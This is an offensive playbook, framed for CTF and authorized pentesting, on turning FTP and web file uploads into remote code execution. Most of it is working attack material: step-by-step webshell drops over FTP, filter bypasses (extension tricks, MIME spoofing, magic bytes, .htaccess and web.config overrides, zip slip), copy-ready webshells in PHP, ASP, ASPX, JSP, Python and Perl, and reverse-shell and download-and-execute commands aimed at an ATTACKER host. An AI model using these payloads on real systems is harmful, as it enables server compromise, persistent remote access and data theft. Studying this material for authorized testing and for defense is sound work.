# Upload Attacks — FTP & Web File Upload Exploitation

Playbook for exploiting file upload functionality to achieve remote code execution. Covers FTP-based webshell drops, web upload filter bypasses, and post-upload execution techniques for CTF and authorized pentesting.

---

## Table of Contents

- [FTP Upload Attacks](#ftp-upload-attacks)
- [Web Upload Filter Bypasses](#web-upload-filter-bypasses)
- [Webshell Payloads](#webshell-payloads)
- [Post-Upload Execution](#post-upload-execution)
- [Quick Reference](#quick-reference)

---

## FTP Upload Attacks

### Recognizing FTP-to-Web Overlap

When an FTP server and a web server share the same document root, any file uploaded via FTP is immediately accessible over HTTP. This is the fastest path to RCE.

**Indicators the FTP root is the web root:**
```bash
# FTP listing shows web files
ftp> ls
index.html          ← web landing page
index.php           ← PHP app
images/             ← asset directory
styles.css
.htaccess

# Or the FTP root IS a known web path
ftp> pwd
/var/www/html       ← Apache default
/usr/share/nginx/html
C:\xampp\htdocs
C:\inetpub\wwwroot
```

**Confirm with a canary file:**
```bash
# Upload a test file via FTP
echo "CANARY_TEST" > test.txt
ftp> put test.txt

# Check if it's web-accessible
curl http://TARGET/test.txt
# If "CANARY_TEST" → FTP root = web root

# Clean up
ftp> delete test.txt
```

### Anonymous FTP Upload

```bash
# Check for anonymous access
ftp TARGET [PORT]
# Username: anonymous
# Password: (blank or any email)

# Check if you can write
ftp> put test.txt
# "226 Transfer complete" → writable
# "550 Permission denied" → read-only
```

**Nmap script to check automatically:**
```bash
nmap -sV -p 21 --script ftp-anon TARGET
# Look for: "Anonymous FTP login allowed"
# Look for: upload/write permissions in the listing
```

### Authenticated FTP Upload

```bash
# With known credentials
ftp TARGET PORT
ftp> user USERNAME
ftp> pass PASSWORD

# Navigate to web root if not already there
ftp> cd /var/www/html
ftp> cd htdocs
ftp> cd public_html

# Upload
ftp> binary                    # switch to binary mode for non-text files
ftp> put webshell.php
ftp> chmod 755 webshell.php    # make it executable/readable by web server
```

### FTP Webshell Drop — Full Sequence

```bash
# 1. Create your webshell locally
echo '<?php system($_GET["cmd"]." 2>&1"); ?>' > cmd.php

# 2. Connect to FTP
ftp TARGET 21
# (or non-standard port like 2121)

# 3. Upload to web-accessible location
ftp> cd /var/www/html          # or wherever the web root is
ftp> put cmd.php
ftp> chmod 755 cmd.php

# 4. Verify RCE
curl "http://TARGET/cmd.php?cmd=id"
# uid=33(www-data) gid=33(www-data) ...

# 5. Reverse shell
# Start listener: nc -lvnp 4444
curl "http://TARGET/cmd.php?cmd=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|bash+-i+2>%261|nc+ATTACKER+4444+>/tmp/f"
```

### FTP Inside Subdirectories

Sometimes FTP drops you above or beside the web root. Enumerate:

```bash
ftp> ls
ftp> cd html
ftp> cd www
ftp> cd public
ftp> cd htdocs
ftp> cd web

# Check each for web files (index.html, .php, etc.)
# Upload your webshell to whichever contains web content
```

### FTP on Non-Standard Ports

CTF boxes often run FTP on unusual ports:

```bash
# Common non-standard FTP ports
ftp TARGET 2121
ftp TARGET 8021
ftp TARGET 30021
ftp TARGET 10021

# Or just connect to whatever nmap found
nmap -sV -p- TARGET | grep ftp
```

---

## Web Upload Filter Bypasses

When the application has a file upload form (profile pictures, documents, attachments), the goal is getting a server-side executable file (`.php`, `.asp`, `.jsp`) past the filters.

### Bypass Strategy Overview

```
1. Try uploading shell.php directly
   ↓ blocked?
2. Change the extension (shell.phtml, shell.php5, shell.phar)
   ↓ blocked?
3. Double extension (shell.php.jpg, shell.jpg.php)
   ↓ blocked?
4. Null byte (shell.php%00.jpg) — older systems
   ↓ blocked?
5. Change Content-Type header to image/jpeg
   ↓ blocked?
6. Prepend real file magic bytes + PHP code
   ↓ blocked?
7. .htaccess upload to make .jpg execute as PHP
   ↓ blocked?
8. Case variation (shell.pHp, shell.PHP)
   ↓ all blocked?
9. Try other stacks: .asp, .aspx, .jsp, .shtml, .cgi
```

### Extension Bypasses

**PHP alternatives (try each):**
```
.php     .php3    .php4    .php5    .php7    .php8
.phtml   .pht     .phps    .phar    .pgif    .inc
.PhP     .pHp     .PHP     .Php
```

**ASP/ASPX:**
```
.asp     .aspx    .ashx    .asmx    .ascx
.cer     .asa     .cdx
```

**JSP:**
```
.jsp     .jspx    .jsw     .jsv     .jtml
.war
```

**Other:**
```
.cgi     .pl      .py      .rb      .sh
.shtml   .stm
```

**Double extensions:**
```
shell.php.jpg       # Apache may parse as PHP if misconfigured
shell.php.png
shell.php.txt
shell.jpg.php       # IIS sometimes reads right-to-left
shell.php.xxxx      # unknown second extension → falls back to first
shell.php%00.jpg    # null byte truncation (PHP < 5.3.4, old Java)
shell.php\x00.jpg   # same, different encoding
shell.php%0a.jpg    # newline injection
```

### Content-Type (MIME) Bypass

The server checks the `Content-Type` header in the multipart upload. Spoof it:

```bash
# Upload PHP file with image Content-Type
curl -X POST http://TARGET/upload.php \
  -F "file=@shell.php;type=image/jpeg"

# Or image/png, image/gif, application/pdf, etc.
```

**With Burp Suite:** Intercept the upload request, change:
```
Content-Type: application/x-php
→
Content-Type: image/jpeg
```

### Magic Bytes (File Signature) Bypass

The server reads the first few bytes to verify the file type. Prepend real magic bytes before PHP code:

```bash
# GIF header + PHP
echo -n 'GIF89a' > shell.php.gif
echo '<?php system($_GET["cmd"]); ?>' >> shell.php.gif

# JPEG header + PHP  (FF D8 FF E0)
printf '\xff\xd8\xff\xe0' > shell.php.jpg
echo '<?php system($_GET["cmd"]); ?>' >> shell.php.jpg

# PNG header + PHP
printf '\x89PNG\r\n\x1a\n' > shell.php.png
echo '<?php system($_GET["cmd"]); ?>' >> shell.php.png

# BMP header + PHP
printf 'BM' > shell.php.bmp
echo '<?php system($_GET["cmd"]); ?>' >> shell.php.bmp

# PDF header + PHP
printf '%%PDF-1.4\n' > shell.pdf.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.pdf.php
```

### .htaccess Upload (Apache)

If you can upload a `.htaccess` file, make Apache treat any extension as PHP:

```bash
# .htaccess that makes .jpg files execute as PHP
echo 'AddType application/x-httpd-php .jpg' > .htaccess

# Upload .htaccess first, then upload shell.jpg
echo '<?php system($_GET["cmd"]); ?>' > shell.jpg

# Both files must be in the same directory
curl "http://TARGET/uploads/shell.jpg?cmd=id"
```

**Other .htaccess tricks:**
```apache
# Execute ALL files as PHP
AddHandler php-script .txt .jpg .png .gif

# Specific file
<Files "shell.jpg">
    SetHandler application/x-httpd-php
</Files>

# Override denied extensions
php_value auto_prepend_file shell.jpg
```

### web.config Upload (IIS)

The IIS equivalent of `.htaccess`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.jpg" verb="*"
           modules="IsapiModule"
           scriptProcessor="%windir%\system32\inetsrv\asp.dll"
           resourceType="Unspecified" requireAccess="Write" />
    </handlers>
    <security>
      <requestFiltering>
        <fileExtensions>
          <remove fileExtension=".asp" />
        </fileExtensions>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
```

### Size / Dimension Checks

Some apps validate image dimensions. Embed PHP in a real image:

```bash
# Create a real image with PHP in EXIF comment
exiftool -Comment='<?php system($_GET["cmd"]); ?>' legit.jpg
mv legit.jpg shell.php.jpg

# Or use a tiny valid image + append PHP
# (1x1 GIF is 43 bytes)
printf 'GIF89a\x01\x00\x01\x00\x00\xff\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x00;' > shell.gif.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.gif.php
```

### Race Condition Uploads

Some apps upload the file, then validate and delete it. Upload fast and access before deletion:

```bash
# Upload in a loop while trying to access it
while true; do
  curl -s -X POST http://TARGET/upload -F "file=@shell.php" &
  curl -s "http://TARGET/uploads/shell.php?cmd=id" &
  wait
done
```

### Zip / Archive Attacks

If the app accepts archives and extracts them:

```bash
# Zip Slip — path traversal via archive entry names
# Creates a zip where the file extracts to ../../shell.php
python3 -c "
import zipfile
z = zipfile.ZipFile('evil.zip', 'w')
z.write('shell.php', '../../var/www/html/shell.php')
z.close()
"

# Symlink attack
ln -s /etc/passwd link
zip -y evil.zip link
# Upload → app extracts → serves /etc/passwd as the file
```

---

## Webshell Payloads

### PHP

```php
/* Minimal one-liner */
<?php system($_GET["cmd"]); ?>

/* With output capture */
<?php echo passthru($_GET['cmd']); ?>

/* Shell_exec (returns string) */
<?php echo shell_exec($_GET['cmd']); ?>

/* POST-based (doesn't show in access logs) */
<?php system($_POST["cmd"]); ?>

/* Password-protected */
<?php if($_GET["k"]==="s3cr3t") system($_GET["cmd"]); ?>

/* Eval-based (for WAF bypass — base64 encoded commands) */
<?php eval(base64_decode($_GET["e"])); ?>
/* Usage: ?e=c3lzdGVtKCdpZCcpOw== (base64 of "system('id');") */

/* File manager + command exec */
<?php
if(isset($_GET['cmd'])) { echo '<pre>'.shell_exec($_GET['cmd']).'</pre>'; }
if(isset($_GET['read'])) { echo '<pre>'.htmlspecialchars(file_get_contents($_GET['read'])).'</pre>'; }
if(isset($_FILES['upload'])) { move_uploaded_file($_FILES['upload']['tmp_name'], $_FILES['upload']['name']); echo "Uploaded"; }
?>

/* Tiny webshell (bypasses length filters) */
<?=`$_GET[c]`?>
/* Usage: ?c=id */
```

### ASP

```asp
<%
Set obj = CreateObject("WScript.Shell")
Set exec = obj.Exec("cmd /c " & Request("cmd"))
Response.Write exec.StdOut.ReadAll()
%>
```

### ASPX

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
string cmd = Request["cmd"];
Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.Arguments = "/c " + cmd;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.Start();
Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
%>
```

### JSP

```jsp
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
    java.io.InputStream is = p.getInputStream();
    int c;
    while ((c = is.read()) != -1) out.print((char)c);
}
%>
```

### Python (CGI)

```python
#!/usr/bin/env python3
import cgi, subprocess, os
print("Content-Type: text/plain\n")
params = cgi.FieldStorage()
if "cmd" in params:
    print(subprocess.getoutput(params["cmd"].value))
```

### Perl (CGI)

```perl
#!/usr/bin/perl
use CGI;
my $q = CGI->new;
print $q->header('text/plain');
if ($q->param('cmd')) { print `${\$q->param('cmd')}` }
```

---

## Post-Upload Execution

### Find Where Uploads Land

```bash
# Common upload directories
http://TARGET/uploads/
http://TARGET/upload/
http://TARGET/files/
http://TARGET/attachments/
http://TARGET/images/
http://TARGET/media/
http://TARGET/tmp/
http://TARGET/user_uploads/
http://TARGET/assets/uploads/
http://TARGET/wp-content/uploads/    # WordPress

# Filename patterns
shell.php                            # original name
<random_hash>.php                    # renamed
<timestamp>_shell.php                # prefixed
shell_<uuid>.php                     # suffixed
```

**If you can't find the upload path:**
```bash
# Check the response after uploading — often contains the path
# Look for: "File uploaded to /uploads/abc123.php"

# Fuzz for the directory
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# If filename is randomized, check the response headers or body
# Some apps return the URL in JSON: {"url": "/uploads/abc.php"}
```

### Reverse Shells From Webshell

```bash
# ── Linux ──

# Bash
curl "http://TARGET/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261'"

# mkfifo + nc
curl "http://TARGET/shell.php?cmd=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|bash+-i+2>%261|nc+ATTACKER+4444+>/tmp/f"

# Python
curl "http://TARGET/shell.php?cmd=python3+-c+'import+os,socket,subprocess;s=socket.socket();s.connect((\"ATTACKER\",4444));[os.dup2(s.fileno(),i)+for+i+in(0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'"

# ── Windows ──

# Download + execute
curl "http://TARGET/shell.php?cmd=certutil+-f+-urlcache+http://ATTACKER:8080/rev.exe+C:\Windows\Temp\rev.exe"
curl "http://TARGET/shell.php?cmd=C:\Windows\Temp\rev.exe"

# PowerShell download cradle
curl "http://TARGET/shell.php?cmd=powershell+-c+IEX(New-Object+Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')"
```

### Execution Without Direct URL Access

If uploaded files aren't directly browsable:

```bash
# Local File Inclusion (LFI) → uploaded file
http://TARGET/page.php?file=../uploads/shell.php
http://TARGET/page.php?file=....//uploads/shell.php

# PHP wrappers
http://TARGET/page.php?file=php://filter/convert.base64-encode/resource=../uploads/shell.php

# Log poisoning (if uploads fail entirely)
# Inject PHP into User-Agent → include the access log
curl -A "<?php system(\$_GET['cmd']); ?>" http://TARGET/
http://TARGET/page.php?file=/var/log/apache2/access.log&cmd=id
```

---

## Quick Reference

```
┌──────────────────────────────────────────────────────────────────┐
│                     FTP UPLOAD ATTACK                            │
│                                                                  │
│  ftp TARGET [PORT]                                               │
│  ftp> put cmd.php          upload webshell                       │
│  ftp> chmod 755 cmd.php    make it accessible                    │
│  curl TARGET/cmd.php?cmd=id    verify RCE                        │
│                                                                  │
├──────────────────────────────────────────────────────────────────┤
│                  WEB UPLOAD BYPASS ORDER                          │
│                                                                  │
│  1. Direct .php upload                                           │
│  2. Alt extensions: .phtml .php5 .phar                           │
│  3. Double ext: .php.jpg   .jpg.php                              │
│  4. Null byte: .php%00.jpg                                       │
│  5. MIME spoof: Content-Type: image/jpeg                         │
│  6. Magic bytes: GIF89a + <?php ... ?>                           │
│  7. .htaccess: AddType application/x-httpd-php .jpg              │
│  8. Case: .pHp .PhP .PHP                                        │
│                                                                  │
├──────────────────────────────────────────────────────────────────┤
│                    WEBSHELL ONE-LINERS                            │
│                                                                  │
│  PHP:   <?php system($_GET["cmd"]); ?>                           │
│  Tiny:  <?=`$_GET[c]`?>                                          │
│  ASP:   see ASP section                                          │
│  JSP:   see JSP section                                          │
│                                                                  │
├──────────────────────────────────────────────────────────────────┤
│                    UPLOAD DIRECTORIES                             │
│                                                                  │
│  /uploads/  /upload/  /files/  /attachments/                     │
│  /images/   /media/   /tmp/    /assets/uploads/                  │
│  /wp-content/uploads/                                            │
│                                                                  │
├──────────────────────────────────────────────────────────────────┤
│              MAGIC BYTES CHEAT SHEET                              │
│                                                                  │
│  GIF:   GIF89a           (47 49 46 38 39 61)                     │
│  JPEG:  ÿØÿà             (FF D8 FF E0)                          │
│  PNG:   .PNG\r\n.\n       (89 50 4E 47 0D 0A 1A 0A)             │
│  BMP:   BM               (42 4D)                                │
│  PDF:   %PDF-1.          (25 50 44 46 2D 31 2E)                 │
│  ZIP:   PK..             (50 4B 03 04)                           │
└──────────────────────────────────────────────────────────────────┘
```

## Tools

| Tool | Use |
|------|-----|
| `Burp Suite` | Intercept uploads, modify extension/Content-Type/body |
| `curl -F` | Script uploads with spoofed MIME types |
| `exiftool` | Embed PHP in image EXIF/comment fields |
| `ffuf` / `gobuster` | Find upload directories |
| `weevely` | Generate obfuscated PHP webshells |
| `msfvenom` | Generate reverse shell payloads for upload |
| `p0wny-shell` | Feature-rich single-file PHP webshell |
| `revshells.com` | Generate reverse shell one-liners |

## References

- [HackTricks — File Upload](https://book.hacktricks.wiki/en/pentesting-web/file-upload/)
- [PayloadsAllTheThings — Upload Insecure Files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
- [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [SecLists — Web Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)
